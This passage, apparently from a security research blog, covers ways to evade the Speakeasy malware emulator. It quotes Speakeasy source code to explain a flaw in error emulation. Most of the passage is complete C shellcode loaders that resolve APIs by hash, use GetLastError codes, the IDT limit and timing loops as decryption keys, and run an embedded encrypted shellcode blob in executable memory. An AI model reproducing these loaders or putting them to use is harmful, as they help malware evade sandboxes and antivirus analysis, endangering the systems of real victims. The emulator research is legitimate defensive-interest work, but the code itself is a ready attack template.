File: [fileman.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/fileman.py#L69)
```py
class File(object):
    curr_handle = 0x80 # Hardcoded base index for file handles -> This was returned during emulation

def file_open(self, path, create=False, truncate=False, is_dir=False):
    ...
    f = File(path, config=fconf)
    hnd = f.get_handle() 
    return hnd

def get_handle(self):
    hfile = File.curr_handle # Returns 0x80
    File.curr_handle += 4    # Increments for the next call
    return hfile
```

The value `0x80` is returned back through the call stack. The variable `rv` in `winemu.py` now contains `0x80` instead of the original `-1`. Speakeasy immediately logs this mutated value, which is why we see the successful return in the console output.
File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1193)
```py
# rv now contains 0x80
self.log_api(oret, imp_api, rv, argv) 
# It is here where we see: 'kernel32.CreateFileA(...) -> 0x80' in our emulation console
```

After that point, SpeakEasy commits the result to the emulated CPU registers. Because the engine returned a valid handle (the hardcoded 0x80 handle), the engine treats the call as successful.

This triggers a post-hook cleanup that synchronizes the Thread Environment Block (TEB), effectively overwriting the 0x2 error set in kernel32.py with 0x0 (ERROR_SUCCESS).
File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1195)
```py
if not self.run_complete and ret == oret and pc == opc:
    # This commits 0x80 to RAX and resets LastError to 0
    self.do_call_return(argc, ret, rv, conv=conv)
```

So when our sample calls `GetLastError()`, instead of `2`, we get `0` because we got a successful returned handle to the file (that does not exist).
File: [kernel32.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/usermode/kernel32.py#L1443)
```py
@apihook('GetLastError', argc=0)
def GetLastError(self, emu, argv, ctx={}):
    rv = emu.get_last_error() # Returns 0 (The corrupted engine state)
    emu.set_last_error(windefs.ERROR_SUCCESS) # Sets last error to 0
    return rv
```

By tracing the flow of SpeakEasy, we see the reason why it fails in the case of invalid file reads. We are now in position to weaponize this.


##### Weaponizing GetLastError() PoC
Now that we know how SpeakEasy behaves on actions that should trigger an error, we can weaponize it to obfuscate our hashes further. We will xor the hashes with 0x02 (the error we would get on real Windows) and on runtime xor them again with the GetLastError() output. This is a short of side-channel obfuscation, where the decryption key is dynamically created based on how real systems would act. We hope that after loading the sample on speakeasy, it will fail to emulate the hashes correctly. The changed code is:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// Same structs as before, PEB walking, shellcode etc etc

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

// Function to resolve API using the GetLastError as the decryption key
void* ResolveApi(uint32_t targetHash, DWORD key) {
    uint32_t unlockedHash = targetHash ^ key; 

    MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
    MY_PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* curr = head->Flink;

    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = (MY_LDR_DATA_TABLE_ENTRY*)CONTAINING_RECORD(curr, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + dos->e_lfanew);
                if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
                    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    DWORD* names = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfNames);
                    WORD* ordinals = (WORD*)((BYTE*)entry->DllBase + exp->AddressOfNameOrdinals);
                    DWORD* funcs = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfFunctions);
                    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                        char* name = (char*)((BYTE*)entry->DllBase + names[i]);
                        size_t len = 0;
                        while(name[len]) len++;
                        
                        // Check against the UNLOCKED hash
                        if (hash((unsigned char*)name, len) == unlockedHash) {
                            return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
                        }
                    }
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

void WINAPI EntryPoint(void) {
    __asm__("sub $0x28, %rsp");

    // Pre-XOR'd hashes with 0x2 (The expected Error Code)
    uint32_t masked_VirtualAlloc    = 0x5ACFDE48;
    uint32_t masked_VirtualProtect  = 0x208602E6;
    uint32_t masked_CreateThread     = 0xA6EE5C24;
    uint32_t masked_WaitForSingleObject = 0x12F29519;
    uint32_t masked_CreateFileA     = 0xDE99D56B;

    PfnCreateFileA pCreateFileA = (PfnCreateFileA)ResolveApi(0xDE99D569, 0); // No key yet
    
    if (!pCreateFileA) ExitProcess(1);

    // Read a non-existent file to trigger the error and get the value 0x2 back
    pCreateFileA("C:\\fake_file.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    
    // Real Windows: runtimeKey = 2
    // Speakeasy: runtimeKey = 0
    DWORD runtimeKey = GetLastError();

    // Try decrypting the hashes with the key
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(masked_VirtualAlloc, runtimeKey);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(masked_VirtualProtect, runtimeKey);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(masked_CreateThread, runtimeKey);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(masked_WaitForSingleObject, runtimeKey);

    // If we are inside SpeakEasy, no hashes will be resolved because of the incorrect key
    if (!pVirtualAlloc || !pCreateThread || !pWaitForSingleObject) {
        ExitProcess(0xDEADC0DE); 
    }

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) {
            ((unsigned char*)exec_mem)[i] = buf[i];
        }

        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) {
                 pWaitForSingleObject(hThread, 0xFFFFFFFF);
             }
        }
    }

    __asm__("add $0x28, %rsp");
    ExitProcess(0);
}
```

Running SpeakEasy on the sample yields incorrect emulation:
```
-$ speakeasy -t poc.exe
* exec: module_entry
0x14000131d: 'kernel32.CreateFileA("C:\\fake_file.txt", "GENERIC_READ", 0x0, 0x0, "OPEN_EXISTING", 0x0, 0x0)' -> 0x80
0x140001326: 'KERNEL32.GetLastError()' -> 0x0
* Timeout of 60 sec(s) reached.
* Finished emulating
```

This evasion technique exploits the Perfectionist's Paradox: Speakeasy is so determined to ensure the malware's 'success' and 'continuity' that it breaks the very rules of the operating system it is trying to emulate. By proactively fixing a failure to keep the sample running, the emulator creates a state of 'impossible perfection'-a valid handle for a non-existent file-which the malware can detect as a clear sign of simulation.


##### Weaponizing IDT Check
Another PoC is using the Interrupt descriptor table (IDT) limit as the key. On x64 Windows, the IDT is at a high-memory, kernel-space address. Because Speakeasy emulates instructions via Unicorn, it might return a zeroed or low-memory address for the IDTR:
```c
#include <windows.h>

typedef struct _IDTR {
    USHORT limit;
    UINT64 base;
} __attribute__((packed)) IDTR;

// we need custom print function since we are compiling without CRT
void PrintString(const char* str) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    WriteConsoleA(hOut, str, lstrlenA(str), &written, NULL);
}

void WINAPI EntryPoint(void) {
    IDTR idtr;
    char buffer[128];
    
    __asm__("sub $0x28, %rsp");

    // Execute SIDT
    __asm__("sidt %0" : "=m"(idtr));

    // Format the output manually using WinAPI
    // We use %I64x for the 64-bit base address
    wsprintfA(buffer, "IDT Limit: 0x%x\nIDT Base:  0x%I64x\n", 
              (UINT)idtr.limit, 
              idtr.base);

    PrintString(buffer);

    // Also exit with the limit so it shows in Speakeasy's logs
    __asm__("add $0x28, %rsp");
    ExitProcess((UINT)idtr.limit);
}
```

In real windows, the output is:
```
>poc.exe
IDT Limit: 0xfff
IDT Base:  0xfffff80000001000
```

The IDT Base unfortunately changes in every system due to ASLR protection, but IDT Limit stays the same. On the other hand, SpeakEasy's IDT Limit is 0.  
Using the same template in SpeakEasy (without printing) we see the process exits with idtr.limit being 0:
```
$ speakeasy -t poc.exe          
  import pkg_resources
* exec: module_entry
0x140001085: 'KERNEL32.ExitProcess(0x0)' -> 0x0
* Finished emulating
```

This is again another approach of a candidate key for encrypting your hashes, meaning you could use the IDT Limit as the key instead of the `GetLastError()` expected code.

## Technique 2 - Timing evasion
One day I was reading an article about the [StealC Malware](https://blog.lexfo.fr/StealC_malware_analysis_part1.html) which had implemented a timing technique to evade emulation. The technique is a form of stalling code (via a delay loop) often categorized as `Execution Guardrails: Time-Based Evasion (a variant of MITRE ATT&CK T1497.003)`:

![stealc emulation bypass](/posts/bypassingspeakeasy/stealc_malware.png)

**In native Windows**, calls like `GetCurrentProcessId` complete very fast, where they essentially involve a quick read from the PEB in memory. However, **in an emulated environment** (like an AV sandbox or SpeakEasy) every API call triggers a "context switch" from the CPU emulator back to the Python or C++ handler.  

More specifically, and comparing with the pervious image of `StealC malware`:
- Most AV engines have a timeout or a maximum instruction count for scanning a single file to prevent the system from hanging. By performing 0x4f672 (325,234) iterations of redundant calls, the malware times-out the sandbox's time limit.
- As noted in the article, there is a second loop (using `GlobalFindAtomA`). This is an additional loop just to ensure that even if the first loop is skipped or fast-forwarded, the second one provides another layer of delay or checks for a different API overhead.

For our SpeakEasy research, we can first use the same technique to see if it will make SpeakEasy stall enough to evade emulation. If indeed SpeakEasy is stalled, we can further secure our code by generating an encryption/decryption key inside the loops (kinda similar to what we did before).

First of all, let's compute the new hashes:
```py
def get_hash(data):
    result = 0
    for c in data:
        char_val = ord(c)
        tmp = char_val + 32
        
        if (((char_val - ord('A')) & 0xFFFF) > 26):
            tmp = char_val
            
        result = (tmp + 0x1003F * result) & 0xFFFFFFFF
    
    return result

api_name = "GetCurrentProcessId"
print(f"Hash for {api_name}: 0x{get_hash(api_name):08X}")

api_name = "GetCurrentProcess"
print(f"Hash for {api_name}: 0x{get_hash(api_name):08X}")

api_name = "GlobalFindAtomA"
print(f"Hash for {api_name}: 0x{get_hash(api_name):08X}")
```
And we get:
```
-$ python add_65599.py
Hash for GetCurrentProcessId: 0x4DA08B07
Hash for GetCurrentProcess: 0x6A6E16CC
Hash for GlobalFindAtomA: 0xE9805554
```

Now, we are ready to build our new template:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void* DllBase;
    void* EntryPoint;
    ULONG SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

typedef struct _MY_PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PMY_PEB_LDR_DATA Ldr; 
} MY_PEB, *PMY_PEB;

typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);

// new structs
typedef DWORD (WINAPI *PfnGetCurrentProcessId)(void);
typedef HANDLE (WINAPI *PfnGetCurrentProcess)(void);
typedef ATOM (WINAPI *PfnGlobalFindAtomA)(LPCSTR);

unsigned char buf[] = 
"\xfc\x48\x83...";

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

void* ResolveApi(uint32_t targetHash) {
    ...
}

void WINAPI EntryPoint(void) {
    __asm__("sub $0x28, %rsp");

    uint32_t h_GetCurrentProcessId = 0x4DA08B07;
    uint32_t h_GetCurrentProcess   = 0x6A6E16CC;
    uint32_t h_GlobalFindAtomA     = 0xE9805554;

    PfnGetCurrentProcessId pGetCurrentProcessId = (PfnGetCurrentProcessId)ResolveApi(h_GetCurrentProcessId);
    PfnGetCurrentProcess pGetCurrentProcess     = (PfnGetCurrentProcess)ResolveApi(h_GetCurrentProcess);
    PfnGlobalFindAtomA pGlobalFindAtomA         = (PfnGlobalFindAtomA)ResolveApi(h_GlobalFindAtomA);

    if (!pGetCurrentProcessId || !pGetCurrentProcess || !pGlobalFindAtomA) ExitProcess(1);

    // anti-emu first loop
    for (unsigned int i = 0; i < 0x4F672; i++) {
        pGetCurrentProcessId();
        pGetCurrentProcess();
    }

    // anti-emu second loop
    for (unsigned int i = 0; i < 0x2B157; i++) {
        pGlobalFindAtomA("dummy_atom");
    }

    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;

    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);

    if (!pVirtualAlloc || !pWaitForSingleObject) ExitProcess(1);

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) {
            ((unsigned char*)exec_mem)[i] = buf[i];
        }

        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) {
                 pWaitForSingleObject(hThread, 0xFFFFFFFF);
             }
        }
    }

    __asm__("add $0x28, %rsp");
    ExitProcess(0);
}
```

In Windows, the calc is launched normally, but on SpeakEasy its different:  

![time_delay_technique1](/posts/bypassingspeakeasy/time_delay_technique1.gif)

And the emulation never reached the resolution of the hashes:
```
└-$ speakeasy -t poc.exe                                                                                         
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
* Child process timeout reached after 60 seconds
* Timeout of 60 sec(s) reached.
* Finished emulating
```

On the other hand, if we used a single WinAPI call (for example `GetCurrentProcessId`), we would get a more verbose result:
```c
...

void EntryPoint() {
    __asm__("and $-16, %rsp");
    __asm__("sub $0x40, %rsp");

    PfnGetCurrentProcessId pPID = (PfnGetCurrentProcessId)ResolveApi(0x4DA08B07);

    if (pPID) {
        for (int i = 0; i < 0x4F672; i++) { 
            pPID(); 
        }
    }

    PfnVirtualAlloc pAlloc = (PfnVirtualAlloc)ResolveApi(0x5ACFDE4A);
    PfnVirtualProtect pProtect = (PfnVirtualProtect)ResolveApi(0x208602E4);
    PfnCreateThread pCreate = (PfnCreateThread)ResolveApi(0xA6EE5C26);
    PfnWaitForSingleObject pWait = (PfnWaitForSingleObject)ResolveApi(0x12F2951B);

    if (pAlloc) {
        void* m = pAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (m) {
            for (int i = 0; i < sizeof(buf); i++) { ((uint8_t*)m)[i] = buf[i]; }
            DWORD old;
            if (pProtect(m, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
                HANDLE t = pCreate(NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
                if (t) pWait(t, INFINITE);
            }
        }
    }
    ExitProcess(0);
}
```

SpeakEasy's output:
```
...
0x140001284: 'kernel32.GetCurrentProcessId()' -> 0x420
0x140001284: 'kernel32.GetCurrentProcessId()' -> 0x420
0x140001284: 'kernel32.GetCurrentProcessId()' -> 0x420
* Maximum number of API calls reached. Stopping current run.
0x140001284: 'kernel32.GetCurrentProcessId()' -> 0x420
* Maximum number of API calls reached. Stopping current run.
* Finished emulating
```

Searching for this message in SpeakEasy's source code, we see that indeed a limit is set.
File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1236)
```py
run = self.get_current_run()
if run and run.get_api_count() > self.max_api_count:
    self.log_info("* Maximum number of API calls reached. Stopping current run.")
    run.error['type'] = 'max_api_count'
    run.error['count'] = self.max_api_count
    run.error['pc'] = hex(self.get_pc())
    run.error['last_api'] = imp_api
    self.on_run_complete()
```


Now that we have verified SpeakEasy times / is limited out, we can weaponize this to once again generate an encryption / decryption key for our hashes.  
This time, to make it a bit more interesting, we will be trying to generate a masterkey created by 3 different subkeys:
- One being the **IDT Limit** from the previous section
- One being the **total time** of running the loops (more on this later)
- One being a **key computed inside the loops**

The masterkey will essentially be:  
$$K_M = K_{IDT} \oplus K_{T} \oplus K_{L}$$
where:
- $$K_{IDT} = \text{IDTR}_{\text{limit}}$$
- $$K_{T} = T_{\text{end}} - T_{\text{start}}$$
- $$K_L = \sum_{i=1}^{0x4F672} \text{Hash}(\text{API\_Return}_i) + \sum_{i=1}^{0x2B157} \text{Hash}(\text{API\_Return}_3)$$

We will also use the previous PoC with the `GetLastError()`. The idea here is to:
- Encrypt / Decrypt the shellcode with the masterkey.
- Encrypt / Decrypt the API Hashes with the `GetLastError()` code 2.

I will be providing the full template with debug messages, such as printing the keys in order for you to compute the encrypted shellcode:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

typedef struct _MY_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } MY_UNICODE_STRING;
typedef struct _MY_PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;
typedef struct _MY_LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; void* DllBase; void* EntryPoint; ULONG SizeOfImage; MY_UNICODE_STRING FullDllName; MY_UNICODE_STRING BaseDllName; } MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
typedef struct _MY_PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; MY_PEB_LDR_DATA* Ldr; } MY_PEB, *PMY_PEB;

// [2] Typedefs
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *PfnGetCurrentProcessId)(void);
typedef HANDLE (WINAPI *PfnGetCurrentProcess)(void);
typedef ATOM   (WINAPI *PfnGlobalFindAtomA)(LPCSTR);
typedef DWORD  (WINAPI *PfnGetTickCount)(void);
typedef HANDLE (WINAPI *PfnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD  (WINAPI *PfnGetLastError)(void);
typedef BOOL   (WINAPI *PfnWriteConsoleA)(HANDLE, const void*, DWORD, LPDWORD, void*);
typedef HANDLE (WINAPI *PfnGetStdHandle)(DWORD);

// This is the encrypted shellcode
// We can leave this empty in our first run in order to compute the key
unsigned char encrypted_buf[] = 
    "\x0f\x8e\xfd\x14\x03\x2e\xbe\xf0\xf3\xc6\x3f\xa1\xb2\x96\x2c"
    "\xa1\xa5\x8e\x4f\x22\x96\x8e\xf5\xa2\x93\x8e\xf5\xa2\xeb\x8e"
    "\xf5\xa2\xd3\x8e\xf5\x82\xa3\x8e\x71\x47\xb9\x8c\x33\xc1\x3a"
    "\x8e\x4f\x30\x5f\xfa\x1f\x8c\xf1\xea\x5e\xb1\x32\x0f\x73\xb1"
    "\xf2\x07\x9c\x1d\xa1\x87\x2f\xb8\x78\x94\x5e\x7b\xb1\xfa\x36"
    "\xf1\x23\x4d\xfe\x78\xf3\xc6\x7e\xb8\x76\x06\x0a\x97\xbb\xc7"
    "\xae\xa0\x78\x8e\x66\xb4\x78\x86\x5e\xb9\xf2\x16\x9d\xa6\xbb"
    "\x39\xb7\xb1\x78\xf2\xf6\xb8\xf2\x10\x33\xc1\x3a\x8e\x4f\x30"
    "\x5f\x87\xbf\x39\xfe\x87\x7f\x31\xcb\x26\x0b\x01\xbf\xc5\x32"
    "\xd4\xfb\x83\x47\x21\x86\x1e\x26\xb4\x78\x86\x5a\xb9\xf2\x16"
    "\x18\xb1\x78\xca\x36\xb4\x78\x86\x62\xb9\xf2\x16\x3f\x7b\xf7"
    "\x4e\x36\xf1\x23\x87\x26\xb1\xab\x98\x27\xaa\xb2\x9e\x3f\xa9"
    "\xb2\x9c\x36\x73\x1f\xe6\x3f\xa2\x0c\x26\x26\xb1\xaa\x9c\x36"
    "\x7b\xe1\x2f\x29\x0f\x0c\x39\x23\xb8\x49\xc7\x7e\xf0\xf3\xc6"
    "\x7e\xf0\xf3\x8e\xf3\x7d\xf2\xc7\x7e\xf0\xb2\x7c\x4f\x7b\x9c"
    "\x41\x81\x25\x48\x26\x63\xda\xf9\x87\xc4\x56\x66\x7b\xe3\x0f"
    "\x26\x8e\xfd\x34\xdb\xfa\x78\x8c\xf9\x46\x85\x10\x86\xc3\xc5"
    "\xb7\xe0\xb4\x11\x9a\xf3\x9f\x3f\x79\x29\x39\xab\x93\x92\xaa"
    "\x1d\xf0";

uint32_t hash(const unsigned char* data, size_t len) {
    uint32_t result = 0;
    for (size_t i = 0; i < len; ++i) {
        uint32_t tmp = (uint32_t)data[i] + 32;
        if ((((int)data[i] - (int)'A') & 0xFFFF) > 26) tmp = data[i];
        result = (uint32_t)(tmp + (0x1003F * result));
    }
    return result;
}

void* ResolveApi(uint32_t targetHash, uint32_t key) {
    MY_PEB* peb = (MY_PEB*)__readgsqword(0x60);
    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    while (curr != head) {
        MY_LDR_DATA_TABLE_ENTRY* entry = (MY_LDR_DATA_TABLE_ENTRY*)curr;
        if (entry->DllBase) {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)entry->DllBase;
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)entry->DllBase + dos->e_lfanew);
            DWORD expVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            if (expVA) {
                PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)entry->DllBase + expVA);
                DWORD* names = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfNames);
                WORD* ordinals = (WORD*)((BYTE*)entry->DllBase + exp->AddressOfNameOrdinals);
                DWORD* funcs = (DWORD*)((BYTE*)entry->DllBase + exp->AddressOfFunctions);
                for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                    char* name = (char*)((BYTE*)entry->DllBase + names[i]);
                    size_t len = 0; while(name[len]) len++;
                    if ((hash((unsigned char*)name, len) ^ key) == targetHash) return (void*)((BYTE*)entry->DllBase + funcs[ordinals[i]]);
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

void RawPrint(PfnWriteConsoleA pWrite, HANDLE hOut, const char* msg) {
    DWORD written;
    int len = 0; while(msg[len]) len++;
    pWrite(hOut, msg, len, &written, NULL);
}

void RawPrintHex(PfnWriteConsoleA pWrite, HANDLE hOut, const char* label, uint32_t val) {
    char hex[] = "0123456789ABCDEF";
    char buf[11] = "0x00000000";
    for(int i=0; i<8; i++) buf[9-i] = hex[(val >> (i*4)) & 0xF];
    RawPrint(pWrite, hOut, label);
    pWrite(hOut, buf, 10, NULL, NULL);
    RawPrint(pWrite, hOut, "\n");
}

void WINAPI EntryPoint(void) {
    __asm__("and $-16, %rsp");
    __asm__("sub $0x80, %rsp");

    PfnWriteConsoleA pWrite = (PfnWriteConsoleA)ResolveApi(0xFB6EDD29, 0); 
    PfnGetStdHandle pGetStd = (PfnGetStdHandle)ResolveApi(0x6B3A8F15, 0);
    PfnCreateFileA pCreateFileA = (PfnCreateFileA)ResolveApi(0xDE99D569, 0);
    PfnGetLastError pGetLastError = (PfnGetLastError)ResolveApi(0xF2834D3C, 0);
    
    HANDLE hOut = pGetStd(STD_OUTPUT_HANDLE);
    RawPrint(pWrite, hOut, "[*] Starting computations\n");

    pCreateFileA("C:\\fake_file.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    uint32_t ErrorKey = pGetLastError(); 
    RawPrintHex(pWrite, hOut, "Artifact Error Key: ", ErrorKey);

    PfnVirtualAlloc pAlloc = (PfnVirtualAlloc)ResolveApi(0x5ACFDE48, ErrorKey);
    PfnCreateThread pCreate = (PfnCreateThread)ResolveApi(0xA6EE5C24, ErrorKey);
    PfnVirtualProtect pProtect = (PfnVirtualProtect)ResolveApi(0x208602E6, ErrorKey);
    PfnWaitForSingleObject pWait = (PfnWaitForSingleObject)ResolveApi(0x12F29519, ErrorKey);

    if (!pAlloc) { 
        RawPrint(pWrite, hOut, "[!] Hash resolution failed. Exiting.\n"); 
        ExitProcess(1); 
    }
    
    PfnGetCurrentProcessId pPID = (PfnGetCurrentProcessId)ResolveApi(0x4DA08B07, 0);
    PfnGetCurrentProcess pProc = (PfnGetCurrentProcess)ResolveApi(0x6A6E16CC, 0);
    PfnGlobalFindAtomA pFindAtom = (PfnGlobalFindAtomA)ResolveApi(0xE9805554, 0);
    PfnGetTickCount pTick = (PfnGetTickCount)ResolveApi(0x67AC75FC, 0);

    DWORD start = pTick();

    struct { uint16_t limit; uint64_t base; } idtr;
    __asm__ ("sidt %0" : "=m" (idtr));
    uint32_t K_IDT = (uint32_t)idtr.limit;
    RawPrintHex(pWrite, hOut, "IDT Limit:          ", K_IDT);

    
    uint32_t stall_key = 0;
    for (unsigned int i = 0; i < 0x4F672; i++) {
        pPID();
        pProc();
        stall_key += i;
    }
    for (unsigned int i = 0; i < 0x2B157; i++) {
        pFindAtom("dummy_atom");
        stall_key += i;
        if (i == 0x2B44) stall_key ^= 0x424A;
    }
    
    ULONGLONG end = pTick();
    uint32_t delta = (uint32_t)(end - start);

    // In real windows, the following action will result in 0
    // since execution will be really fast
    // and thus delta >> 10 will be 0, compared to emulators
    // that need a lot more time to finish -> time_pill != 0
    uint32_t K_T = delta >> 10;

    RawPrintHex(pWrite, hOut, "Temporal Key:       ", K_T);

    uint32_t MasterKey = K_IDT ^ K_T ^ stall_key;
    RawPrintHex(pWrite, hOut, "[*] Final MasterKey:    ", MasterKey);

    for (int i = 0; i < sizeof(encrypted_buf); i++) {
        encrypted_buf[i] ^= ((unsigned char*)&MasterKey)[i % 4];
    }
    RawPrintHex(pWrite, hOut, "shellcode[0] (Plaintext): ", (uint32_t)encrypted_buf[0]);

    void* m = pAlloc(0, sizeof(encrypted_buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (m) {
        for (int i = 0; i < sizeof(encrypted_buf); i++) { ((unsigned char*)m)[i] = encrypted_buf[i]; }
        DWORD old;
        if (pProtect(m, sizeof(encrypted_buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE h = pCreate(NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
             if (h) pWait(h, 0xFFFFFFFF);
        }
    }
    ExitProcess(0);
}
```

Assuming in our first run we don't have the encrypted shellcode, we get the following key values:
```
[*] Starting computations
